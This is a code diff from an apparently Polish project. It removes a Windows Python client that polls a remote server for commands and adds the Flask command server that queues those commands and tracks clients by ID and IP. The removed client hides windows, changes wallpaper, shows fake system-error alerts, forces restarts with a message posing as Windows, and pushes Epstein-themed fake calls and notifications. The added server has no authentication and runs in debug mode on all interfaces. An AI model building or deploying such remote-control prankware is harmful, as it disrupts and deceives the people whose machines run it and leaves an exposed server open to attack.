@@ -1,185 +1,103 @@
-import socket
+from flask import Flask, render_template, request, jsonify, send_from_directory
 import time
-import ctypes
-import overlay
-import music
-from config import tapeta11, tapeta2, barka, tapeta12, tapeta13, Epstine_img
-import epstine
 import os
-import powiadomienia
-import epstinecall
-import cdroom
-import webbrowser
-import random
-import winsound
-import subprocess
-import requests
-import uuid
-from plyer import notification
+from flask_cors import CORS
 
-# Wygeneruj unikalny ID dla tego klienta
-CLIENT_ID = str(uuid.uuid4())
-SERVER_URL = "https://twój-serwer.onrender.com"  # Zmień na swój URL Render
-final_name = "Windows_Client"
+app = Flask(__name__)
+CORS(app)  # Ważne dla komunikacji między domenami
 
-def hide_all_windows():
-    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
-    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
-    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
-    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
+clients = {}
 
-def set_default_wallpaper():
-    default_wallpaper = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
-    if os.path.exists(default_wallpaper):
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, default_wallpaper, 3)
-        print("Przywrócono domyślną tapetę Windows.")
-    else:
-        print("Nie znaleziono domyślnej tapety Windows.")
+@app.route("/")
+def index():
+    return render_template("index.html")
 
-def set_wallpaper(path):
-    if not os.path.exists(path):
-        print(f"Brak tapety: {path}")
-        return
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
-    print(f"Tapeta ustawiona: {path}")
+@app.route("/static/<path:path>")
+def serve_static(path):
+    return send_from_directory('static', path)
 
-def start():
-    hide_all_windows()
-    music.play_music(barka)
-    overlay.start_overlay()
-    set_wallpaper(tapeta11)
-
-def stop():
-    music.stop_music()
-    overlay.stop_overlay()
-    set_default_wallpaper()
-
-def przylece():
-    print("Otwieranie strony w nowym oknie...")
-    url = "https://www.youtube.com/watch?v=COjRbZg-eKc"
-    webbrowser.open_new(url)
-
-def play_error_sound():
-    winsound.PlaySound("SystemHand", winsound.SND_ALIAS)
-
-def fake_virus_alert():
-    ctypes.windll.user32.MessageBoxW(
-        0,
-        "System Alert",
-        "Critical System Error Detected!",
-        0x10
-    )
-
-def restart():
-    subprocess.run(['shutdown', '/r', '/t', '10', '/c', "System windows wymaga restartu komputera. Komputer zostanie uruchomiony ponownie za 10 sekund."])
-
-def system_notification(title, message, timeout=5):
-    try:
-        notification.notify(
-            title=title,
-            message=message,
-            timeout=timeout,
-            app_name="Windows Program",
-        )
-        return True
-    except Exception as e:
-        print(f"Błąd powiadomienia: {e}")
-        return False
-
+# Endpoint do rejestracji klienta
+@app.route("/api/register", methods=["POST"])
 def register_client():
-    """Rejestruje klienta na serwerze"""
-    try:
-        response = requests.post(f"{SERVER_URL}/api/register", 
-                                json={"id": CLIENT_ID, "name": final_name},
-                                timeout=5)
-        if response.status_code == 200:
-            print(f"Zarejestrowano klienta: {CLIENT_ID}")
-            return True
-    except Exception as e:
-        print(f"Błąd rejestracji: {e}")
-    return False
-
-def get_command():
-    """Pobiera komendę z serwera"""
-    try:
-        response = requests.post(f"{SERVER_URL}/api/get_command",
-                                json={"id": CLIENT_ID},
-                                timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get("command")
-    except Exception as e:
-        print(f"Błąd pobierania komendy: {e}")
-    return None
-
-def execute_command(cmd):
-    """Wykonuje komendę otrzymaną z serwera"""
-    if cmd is None:
-        return
+    data = request.json
+    client_id = data.get("id")
     
-    print(f"Wykonuję komendę: {cmd}")
-    
-    if cmd == "start":
-        start()
-    elif cmd == "stop":
-        stop()
-    elif cmd == "epstine":
-        epstine.start_epstine_start_in_background()
-    elif cmd == "stopepstine":
-        epstine.epstinestop()
-    elif cmd == "hideallwindows":
-        hide_all_windows()
-    elif cmd == "call elon musk":
-        epstinecall.epstinecall("Elon Musk", tapeta13)
-    elif cmd == "call donald trump":
-        epstinecall.epstinecall("Donald Trump", tapeta12)
-    elif cmd == "call epstine":
-        epstinecall.epstinecall("Jeffrey Epstein", Epstine_img)
-    elif cmd == "powiadomienie epstine":
-        powiadomienia.show_custom_notification(
-            title=" ",
-            message="",
-            buttons=[
-                {"text": "Udaj się na wyspe", "command": przylece}
-            ]
-        )
-    elif cmd == "fake virus alert":
-        fake_virus_alert()
-    elif cmd == "powiadomienie test":
-        system_notification("Witaj", "Otrzymałeś zaproszenie do grona znajomych od użytkownika Jeffry Epstine", 10)
-    elif cmd == "restart":
-        restart()
-    elif cmd == "error sound":
-        play_error_sound()
+    if client_id not in clients:
+        clients[client_id] = {
+            "id": client_id,
+            "ip": request.remote_addr,
+            "last_seen": time.time(),
+            "command": None,
+            "name": data.get("name", "Unknown")
+        }
+        print(f"Zarejestrowano nowego klienta: {client_id}")
     else:
-        print(f"Nieznana komenda: {cmd}")
+        clients[client_id]["last_seen"] = time.time()
+        clients[client_id]["name"] = data.get("name", clients[client_id].get("name", "Unknown"))
+    
+    return jsonify({"status": "registered"})
+
+# Endpoint do pobierania komendy
+@app.route("/api/get_command", methods=["POST"])
+def get_command():
+    data = request.json
+    client_id = data.get("id")
+    
+    if client_id in clients:
+        clients[client_id]["last_seen"] = time.time()
+        command = clients[client_id].get("command")
+        clients[client_id]["command"] = None  # Resetuj komendę po pobraniu
+        
+        return jsonify({"command": command})
+    
+    return jsonify({"command": None})
+
+# Endpoint do wysyłania komendy
+@app.route("/api/send_command", methods=["POST"])
+def send_command():
+    data = request.json
+    client_id = data.get("client_id")
+    command = data.get("command")
+    
+    if client_id in clients:
+        clients[client_id]["command"] = command
+        print(f"Wysłano komendę '{command}' do klienta {client_id}")
+        return jsonify({"success": True, "message": "Command sent"})
+    
+    return jsonify({"success": False, "message": "Client not found"})
+
+# Lista wszystkich klientów
+@app.route("/api/clients", methods=["GET"])
+def get_clients():
+    client_list = []
+    current_time = time.time()
+    
+    # Usuń nieaktywnych klientów (ostatnio widziani > 60 sekund temu)
+    inactive_clients = []
+    for client_id, client_data in clients.items():
+        if current_time - client_data["last_seen"] > 60:
+            inactive_clients.append(client_id)
+    
+    for client_id in inactive_clients:
+        del clients[client_id]
+    
+    # Przygotuj listę aktywnych klientów
+    for client_id, client_data in clients.items():
+        client_list.append({
+            "id": client_id,
+            "ip": client_data["ip"],
+            "name": client_data["name"],
+            "last_seen": client_data["last_seen"],
+            "status": "active" if (current_time - client_data["last_seen"]) < 10 else "inactive"
+        })
+    
+    return jsonify(client_list)
+
+# Endpoint do sprawdzania statusu
+@app.route("/api/ping", methods=["GET"])
+def ping():
+    return jsonify({"status": "online", "time": time.time()})
 
 if __name__ == "__main__":
-    print(f"=== Client ID: {CLIENT_ID} ===")
-    print(f"=== Server: {SERVER_URL} ===")
-    
-    # Rejestracja klienta
-    if register_client():
-        print("Rejestracja udana. Rozpoczynam nasłuchiwanie komend...")
-        
-        while True:
-            try:
-                # Pobierz komendę z serwera
-                command = get_command()
-                
-                # Jeśli jest komenda, wykonaj ją
-                if command:
-                    execute_command(command)
-                
-                # Poczekaj przed kolejnym sprawdzeniem
-                time.sleep(2)
-                
-            except KeyboardInterrupt:
-                print("Zatrzymywanie klienta...")
-                stop()
-                break
-            except Exception as e:
-                print(f"Błąd w pętli głównej: {e}")
-                time.sleep(5)
-    else:
-        print("Nie udało się zarejestrować na serwerze. Spróbuj ponownie później.")
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port, debug=True)
